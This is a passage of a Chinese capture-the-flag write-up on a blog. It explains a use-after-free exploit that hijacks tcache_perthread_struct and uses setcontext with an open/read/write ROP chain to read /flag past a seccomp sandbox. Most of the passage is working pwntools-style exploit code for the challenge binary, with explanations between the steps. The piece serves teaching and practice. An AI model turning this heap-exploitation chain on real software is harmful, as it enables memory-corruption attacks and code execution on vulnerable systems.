&amp;&amp; heap_buffer )<br>    __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Content: %s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_buffer);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// delete函数 - 释放堆内存，存在Use After Free漏洞</span><br><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  __printf_chk(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(&amp;unk_1144, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( !v1 &amp;&amp; heap_buffer )<br>    <span class="hljs-built_in">free</span>(heap_buffer);                          <span class="hljs-comment">// UAF</span><br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>可以看到很明显的 UAF，并且 idx 只能为 0，有沙箱，ORW</p>
+<p>可以通过控制 tcache_perthread_struct 然后 setcontext 迁移栈，实现 orw</p>
+<p>由于沙箱的存在，tcache 原本就有一些 free chunk，那么我们可以分配一个有 chunk 的 tcache 链中，然后通过UAF + show() 泄露一个堆块的地址，计算固定偏移，得出 heapbase</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x78</span>)<br>delete()<br>show()<br>ru(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heapbase=u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x11b0</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们 edit 写入 heapbase+0x10，由于 0x250 的这个 tcache_perthread_struct  是最先分配的，它就在 heapbase 上，如果我们直接分配 heapbase 会破坏 size 为，所以要 +0x10，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(p64(heapbase+<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x78</span>)<br>add(<span class="hljs-number">0x78</span>)<br></code></pre></td></tr></table></figure>
+
+<p>分配两次得到 heapbase，也就是 tcache_perthread_struct  </p>
+<p>这里我们往里面写入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x0000000007000000</span>))<br></code></pre></td></tr></table></figure>
+
+<p>这个就是写 0x250 的 tcache 链已经满了，这样我们释放时，就会让这个堆块进入 unsortedbin，从而泄露 libcbase，效果如下</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770811309784.png" srcset="/img/loading.gif" lazyload alt="1770811309784"></p>
+<p>为什么是 0x250 而不是 0x80，因为 tcache 的分配不会检查 size， 也不会写 size，只是将这个 chunk 拿出来，原本是多大还是多大，所以我们上面第二个 add(0x78) 其实是分配了这个 0x250 的堆块， delete() 后即可让其进入 unsortedbin，然后计算libcbase，并且得到各个 gadgets 的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">delete()<br>show()<br>ru(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libcbase=u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span><br>free_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] libcbase &quot;</span>,<span class="hljs-built_in">hex</span>(libcbase))<br>rdi_addr=libcbase+<span class="hljs-number">0x00000000000215bf</span><br>rsi_addr=libcbase+<span class="hljs-number">0x0000000000023eea</span><br>rdx_addr=libcbase+<span class="hljs-number">0x0000000000001b96</span><br>rax_addr=libcbase+<span class="hljs-number">0x0000000000043ae8</span><br>ret_addr=libcbase+<span class="hljs-number">0x00000000000008aa</span><br>syscall=libcbase+<span class="hljs-number">0x00000000000d2745</span><br>read_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>setcontext=libcbase+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br></code></pre></td></tr></table></figure>
+
+<p>然后是写出各个需要的地址和 orw</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">flag_str=heapbase+<span class="hljs-number">0x1000</span> <span class="hljs-comment"># 写/flag 的地方</span><br>f_stack=heapbase+<span class="hljs-number">0x2000</span> <span class="hljs-comment"># 改写的 rsp 的地方</span><br>stack_rop=heapbase+<span class="hljs-number">0x20a0</span> <span class="hljs-comment"># 写 rop 的地方 与上方 f_stack 差 0xa0，待会儿就是控制 rdi 为 f_stack，然后控制 rsp 为 stack_rop</span><br>orw1=heapbase+<span class="hljs-number">0x3000</span> <span class="hljs-comment"># 写orw的第一处（一处写不下）</span><br>orw2=heapbase+<span class="hljs-number">0x3040</span> <span class="hljs-comment"># 写orw的第二处（这两块是连一起的，因为 tcache 的分配不会写任何东西）</span><br>orw=p64(rax_addr)+p64(<span class="hljs-number">2</span>)+p64(rdi_addr)+p64(flag_str)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0</span>)+p64(syscall) <span class="hljs-comment"># open</span><br>orw+=p64(rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(rsi_addr)+p64(heapbase+<span class="hljs-number">0x3000</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)+p64(read_addr) <span class="hljs-comment"># read</span><br>orw+=p64(rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(write_addr) <span class="hljs-comment"># write</span><br></code></pre></td></tr></table></figure>
+
+<p>然后将这些数据写入 tcache 中，为接下去的分配做准备</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;\x01&#x27;</span>*<span class="hljs-number">64</span><br>payload+=p64(free_hook) <span class="hljs-comment"># 0x20</span><br>payload+=p64(flag_str) <span class="hljs-comment"># 0x30</span><br>payload+=p64(f_stack) <span class="hljs-comment"># 0x40</span><br>payload+=p64(stack_rop) <span class="hljs-comment"># 0x50</span><br>payload+=p64(orw1) <span class="hljs-comment"># 0x60</span><br>payload+=p64(orw2) <span class="hljs-comment"># 0x70</span><br>edit(payload)<br></code></pre></td></tr></table></figure>
+
+<p>效果如下</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770811786466.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后分配 0x10 ，将 setcontext+53 写入 free_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>)<br>edit(p64(setcontext))<br></code></pre></td></tr></table></figure>
+
+<p>然后分配 0x20 将 &#x2F;flag 这个字符串写进去，以便 open(&#x2F;flag,0,0)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p> 然后分两次写入我们的 orw 串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x50</span>)<br>edit(orw[:<span class="hljs-number">0x40</span>])<br>add(<span class="hljs-number">0x60</span>)<br>edit(orw[<span class="hljs-number">0x40</span>:])<br></code></pre></td></tr></table></figure>
+
+<p>然后将 orw 的地址写入到我们伪造的栈上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x40</span>)<br>edit(p64(orw1)+p64(ret_addr))<br></code></pre></td></tr></table></figure>
+
+<p>为何需要 ret_addr ，因为后面会有一个 push rcx 会使 rsp-8，够不着我们的 orw 串，我们在 [rdi+0xa8] 这个地址处写入 ret_addr，控制 rcx&#x3D;ret_addr，从而 push 后有一个 ret，相当于先执行一个 ret 再执行 orw，以便拿到 flag</p>
+<p>然后就是 delete 来触发 setcontext 以及 orw，拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>)<br>delete()<br></code></pre></td></tr></table></figure>
+
+<p>这里控制 rdi&#x3D;f_stack，从而控制 rsp，从而控制 rip，控制程序执行 orw，拿到flag</p>
+<p>效果如下</p>
+<p><img src="/2025/05/19/IO_FILE%20Exploit/ad_struct%E4%B8%8Esetcontext/1770812356227.png" srcset="/img/loading.gif" lazyload></p>
+<p>总结下：</p>
+<ul>
+<li>利用已有 chunk 泄露 heapbase</li>
+<li>UAF 控制 tcache_perthread_struct  ，泄露 libcbase</li>
+<li>setcontext 与 orw 搭配拿到 flag</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>初探tcache_perthread_struct与setcontext</div>
+      <div>http://yyyffff.github.io/2026/02/11/初探tcache_perthread_struct与setcontext/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>yyyffff</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/20/CVE-2023-34644%E5%A4%8D%E7%8E%B0/" title="CVE-2023-34644复现">
+                        <span class="hidden-mobile">CVE-2023-34644复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2bkS2AvQTqNk4TIsyxh4ew9q-gzGzoHsz","appKey":"GfRH0zMaM1USTNT6w25DTqu8","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
